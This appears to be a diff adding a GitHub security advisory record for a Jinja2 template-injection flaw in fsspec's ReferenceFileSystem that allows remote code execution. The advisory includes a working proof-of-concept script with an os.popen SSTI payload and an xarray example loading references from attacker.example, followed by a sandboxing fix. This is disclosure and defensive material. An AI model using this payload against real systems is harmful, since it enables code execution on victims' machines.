@@ -1,0 +1,129 @@
+{
+  "id": "GHSA-27vj-qcqg-25rc",
+  "modified": "2026-10-05T23:00:06.213351946Z",
+  "published": "2026-10-05T22:53:22Z",
+  "aliases": [
+    "CVE-2026-104851"
+  ],
+  "summary": "fsspec: Server-Side Template Injection in ReferenceFileSystem leads to Remote Code Execution",
+  "details": "### Summary\n\n`fsspec.implementations.reference.ReferenceFileSystem` parses a \"references\"\nJSON document (Kerchunk format) supplied either inline or via a URL. The\nparser renders fields from this JSON through **un-sandboxed**\n`jinja2.Template(...).render(...)` calls in three locations. An attacker who\ncontrols the JSON document — typically by hosting it at a URL that the\nvictim opens with `fsspec.filesystem(\"reference\", fo=URL)` or via\n`xarray.open_dataset(\"reference://...\")` — achieves arbitrary Python code\nexecution on the victim machine, before any data is read.\n\nThis mirrors the pattern of [CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359)\nin `llama-cpp-python`, where externally-sourced template strings were\nrendered with the default unrestricted Jinja2 environment.\n\n### Affected versions\n\nAll versions of `fsspec` from `0.9.0` onward (vulnerable code introduced in\ncommit `0fb8d56b684ee74ad9ad4587fd560bde1b116450`, 2021-03-12). Confirmed on\nthe latest released version `2025.10.0`.\n\n### Affected sinks\n\nAll in `fsspec/implementations/reference.py`:\n\n| Sink | Location | Trigger |\n|---|---|---|\n| A — `_process_references1._render_jinja` | lines 1016-1018 | `simple_templates=False` and a `refs` entry contains `{{` |\n| B — `_process_templates` (lambda) | lines 1043-1053 | `templates` dict has values containing `{{`, invoked later via render context |\n| C — `_process_gen` | lines 1075-1083 | references JSON contains a `gen` array (always reached, regardless of `simple_templates`) |\n\nSink C is the most severe: it is reached unconditionally for any references\nJSON that includes a `gen` field.\n\nThe vulnerable code:\n\n```python\n# fsspec/implementations/reference.py\n# Sink A\n@lru_cache(1000)\ndef _render_jinja(u):\n    return jinja2.Template(u).render(**self.templates)  # \u003c- unsandboxed\n\n# Sink B\ndef _process_templates(self, tmp):\n    ...\n    for k, v in tmp.items():\n        if \"{{\" in v:\n            import jinja2\n            self.templates[k] = lambda temp=v, **kwargs: jinja2.Template(\n                temp                                       # \u003c- unsandboxed\n            ).render(**kwargs)\n\n# Sink C\ndef _process_gen(self, gens):\n    ...\n    for pr in products:\n        import jinja2\n        key = jinja2.Template(gen[\"key\"]).render(**pr, **self.templates)        # \u003c- unsandboxed\n        url = jinja2.Template(gen[\"url\"]).render(**pr, **self.templates)        # \u003c- unsandboxed\n        if (\"offset\" in gen) and (\"length\" in gen):\n            offset = int(jinja2.Template(gen[\"offset\"]).render(...))            # \u003c- unsandboxed\n            length = int(jinja2.Template(gen[\"length\"]).render(...))            # \u003c- unsandboxed\n```\n\n### Proof of concept (Sink C, minimal)\n\nSave as `poc.py`:\n\n```python\nimport http.server, json, socketserver, threading, time, fsspec\nfrom pathlib import Path\n\nPAYLOAD = \"{{ joiner.__init__.__globals__.os.popen('touch /tmp/fsspec_pwned_$(whoami)').read() }}\"\nREF = {\n    \"version\": 1, \"templates\": {}, \"refs\": {\"x\": \"x\"},\n    \"gen\": [{\n        \"key\": PAYLOAD + \"/{{ i }}\", \"url\": \"http://example.com/{{ i }}\",\n        \"offset\": \"0\", \"length\": \"0\", \"dimensions\": {\"i\": [0]},\n    }],\n}\n\nbody = json.dumps(REF).encode()\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200); self.end_headers(); self.wfile.write(body)\n    def log_message(self, *a, **kw): pass\n\nsrv = socketserver.TCPServer((\"127.0.0.1\", 0), H)\nthreading.Thread(target=srv.serve_forever, daemon=True).start()\nurl = f\"http://127.0.0.1:{srv.server_address[1]}/refs.json\"\n\nfor p in Path(\"/tmp\").glob(\"fsspec_pwned_*\"): p.unlink()\ntry:\n    fsspec.filesystem(\"reference\", fo=url)\nexcept Exception as e:\n    print(\"exception:\", e)\nsrv.shutdown()\ntime.sleep(0.3)\nprint(\"markers:\", list(Path(\"/tmp\").glob(\"fsspec_pwned_*\")))\n```\n\nRun:\n\n```\npip install fsspec aiohttp requests jinja2\npython3 poc.py\n# → markers: [PosixPath('/tmp/fsspec_pwned_\u003cuser\u003e')]\n```\n\n### End-to-end via xarray (real-world consumer pathway)\n\n```python\nimport xarray as xr\nds = xr.open_dataset(\n    \"reference://\",\n    engine=\"zarr\",\n    backend_kwargs={\n        \"consolidated\": False,\n        \"storage_options\": {\n            \"fo\": \"http://attacker.example/refs.json\",\n            \"remote_protocol\": \"http\",\n        },\n    },\n)\n# RCE fires before any data is materialised.\n```\n\n### Tested on\n\n- fsspec 2025.10.0, jinja2 3.1.6, Python 3.9, macOS 14\n- fsspec 2025.10.0, jinja2 3.1.6, Python 3.12-slim, Docker Linux\n\n### Impact\n\n`fsspec.ReferenceFileSystem` is the canonical entrypoint for the **Kerchunk**\nformat, widely used in the Pangeo / Earth-observation / climate\ndata-science ecosystem to provide cloud-optimised views of\nHDF5 / NetCDF / GRIB archives hosted on object storage.\n\nRealistic attack vectors:\n\n- A user opens a community-shared Kerchunk catalogue link via xarray/dask.\n- A managed data-science platform (notebook server, batch job runner)\n  ingests user-submitted Kerchunk URLs.\n- A workflow downloads a catalogue from a bucket whose contents have\n  been tampered with (supply chain).\n\nIn every case, the victim performs no action beyond opening a \"reference\nfilesystem\" — there is no documented expectation that a data catalogue\ncan execute arbitrary Python code.\n\n### Suggested fix\n\nReplace `jinja2.Template(...)` with a shared\n`jinja2.sandbox.ImmutableSandboxedEnvironment` for all three sinks. This\nmatches the post-incident hardening applied to `llama-cpp-python` after\nCVE-2024-34359.\n\n```python\n# At module top\ndef _sandboxed_env():\n    import jinja2.sandbox\n    env = getattr(_sandboxed_env, \"_env\", None)\n    if env is None:\n        env = jinja2.sandbox.ImmutableSandboxedEnvironment()\n        _sandboxed_env._env = env\n    return env\n```\n\nThen in each sink, replace `jinja2.Template(s).render(...)` with\n`_sandboxed_env().from_string(s).render(...)`.\n\nThe legitimate Kerchunk template syntax (simple variable substitution\nlike `{{ varname }}`) continues to work under the sandbox; only the SSTI\ngadgets (`__class__`, `__init__.__globals__`, `__subclasses__`, etc.)\nare refused with `jinja2.exceptions.SecurityError`.\n\nA complete patch is available on request.\n\n### Credit\n\nReported by Dany.A",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "fsspec",
+        "purl": "pkg:pypi/fsspec"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.9.0"
+            },
+            {
+              "fixed": "2026.6.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.9.0",
+        "2021.10.0",
+        "2021.10.1",
+        "2021.11.0",
+        "2021.11.1",
+        "2021.4.0",
+        "2021.5.0",
+        "2021.6.0",
+        "2021.6.1",
+        "2021.7.0",
+        "2021.8.1",
+        "2021.9.0",
+        "2022.1.0",
+        "2022.10.0",
+        "2022.11.0",
+        "2022.2.0",
+        "2022.3.0",
+        "2022.5.0",
+        "2022.7.0",
+        "2022.7.1",
+        "2022.8.0",
+        "2022.8.1",
+        "2022.8.2",
+        "2023.1.0",
+        "2023.10.0",
+        "2023.12.0",
+        "2023.12.1",
+        "2023.12.2",
+        "2023.3.0",
+        "2023.4.0",
+        "2023.5.0",
+        "2023.6.0",
+        "2023.9.0",
+        "2023.9.1",
+        "2023.9.2",
+        "2024.10.0",
+        "2024.12.0",
+        "2024.2.0",
+        "2024.3.0",
+        "2024.3.1",
+        "2024.5.0",
+        "2024.6.0",
+        "2024.6.1",
+        "2024.9.0",
+        "2025.10.0",
+        "2025.12.0",
+        "2025.2.0",
+        "2025.3.0",
+        "2025.3.1",
+        "2025.3.2",
+        "2025.5.0",
+        "2025.5.1",
+        "2025.7.0",
+        "2025.9.0",
+        "2026.1.0",
+        "2026.2.0",
+        "2026.3.0",
+        "2026.4.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-27vj-qcqg-25rc/GHSA-27vj-qcqg-25rc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/fsspec/filesystem_spec/security/advisories/GHSA-27vj-qcqg-25rc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104851"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/fsspec/filesystem_spec/pull/2029"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/fsspec/filesystem_spec/pull/2039"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/fsspec/filesystem_spec/commit/86438783f93b1398ef245b92f0e6063b445b611c"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/fsspec/filesystem_spec/commit/a1c16ab3f07f354aa371c38f7b1b07ea7fd4c5c8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/fsspec/filesystem_spec"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/fsspec/filesystem_spec/releases/tag/2026.6.0"
+    }
+  ]
+}
